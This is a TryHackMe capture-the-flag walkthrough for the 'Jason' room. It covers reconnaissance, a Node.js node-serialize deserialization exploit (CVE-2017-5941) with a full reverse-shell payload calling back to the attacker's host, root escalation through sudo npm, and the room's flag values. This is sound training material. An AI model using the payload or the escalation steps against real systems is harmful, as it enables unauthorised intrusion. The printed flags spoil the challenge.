# TryHackMe: Jason Walkthrough (Expert Level)

**Room Name:** Jason  
**Room Title:** Jax sucks alot.....  
**Target Machine IP:** 10.49.181.93  
**Difficulty:** Easy  
**Author:** Expert Recon

---

## 1. Initial Reconnaissance

### Nmap Scan
The initial phase involves a service and script scan to identify the attack surface of the target machine.

```bash
nmap -sV -sC -T4 10.49.181.93
```

**Results:**
- **Port 22/tcp:** Open (OpenSSH 8.2p1 Ubuntu 4ubuntu0.13)
- **Port 80/tcp:** Open (Node.js web server - Horror LLC)

---

## 2. Web Application Analysis

The web server at `http://10.49.181.93` presents a "Coming soon!" landing page for "Horror LLC." It includes a simple newsletter signup form. 

### Cookie Identification
When an email is submitted via the form, the application sets a `session` cookie.
```bash
# Example decoded session cookie
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==" | base64 -d
# Output: {"email":"test@test.com"}
```
The cookie is a Base64-encoded JSON object, which is a key indicator for potential **Insecure Deserialization** vulnerabilities in Node.js applications, specifically targeting the `node-serialize` library (CVE-2017-5941).

---

## 3. Initial Access: Node.js Deserialization (CVE-2017-5941)

The server utilizes the `node-serialize` library to deserialize the session cookie. This library is vulnerable to Remote Code Execution (RCE) when it processes a specifically crafted serialized object. By prefixing a function with `_$$ND_FUNC$$_`, we can force the server to execute that function during the deserialization process.

### Payload Construction
We craft a self-invoking function that initiates a reverse shell.

**Reverse Shell Payload:**
```javascript
{"email":"_$$ND_FUNC$$_function (){ (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(4444, \"<YOUR_IP>\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); }()"}
```

### Execution Strategy
1. Start a local netcat listener: `nc -lvnp 4444`.
2. Base64 encode the payload above.
3. Replace the `session` cookie in the HTTP request (via Burp Suite or Browser Console) with the encoded payload.
4. Refresh the page to trigger the execution on the server.

Upon successful execution, we gain a shell as the user **dylan**.

---

## 4. User Flag

The user flag is located in Dylan's home directory.

```bash
cat /home/dylan/user.txt
```

**User Flag:** `0ba48780dee9f5677a4461f588af217c`

---

## 5. Privilege Escalation

Enumeration of the user's sudo privileges reveals an exploitable entry.

```bash
sudo -l
```

**Findings:**
```text
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm
```

### Exploiting NPM (GTFOBins)
The `npm` binary can execute arbitrary scripts defined in a `package.json` file. Since we can run `npm` with root privileges without a password, we can escalate to root by defining a `preinstall` script that spawns a shell.

**Step-by-Step Escalation:**
1. Create a temporary directory:
   ```bash
   TF=$(mktemp -d)
   ```
2. Create a `package.json` file containing the malicious script:
   ```bash
   echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
   ```
3. Execute the package installation with sudo, utilizing the `-C` flag to specify the directory and `--unsafe-perm` to ensure the script runs as root:
   ```bash
   sudo /usr/bin/npm -C $TF --unsafe-perm i
   ```

You will immediately be granted a **root shell**.

---

## 6. Root Flag

The root flag is located in the root user's home directory.

```bash
cat /root/root.txt
```

**Root Flag:** `2cd5a9fd3a0024bfa98d01d69241760e`

---

## Summary Table

| Flag | Value |
| :--- | :--- |
| **User (user.txt)** | `0ba48780dee9f5677a4461f588af217c` |
| **Root (root.txt)** | `2cd5a9fd3a0024bfa98d01d69241760e` |

---

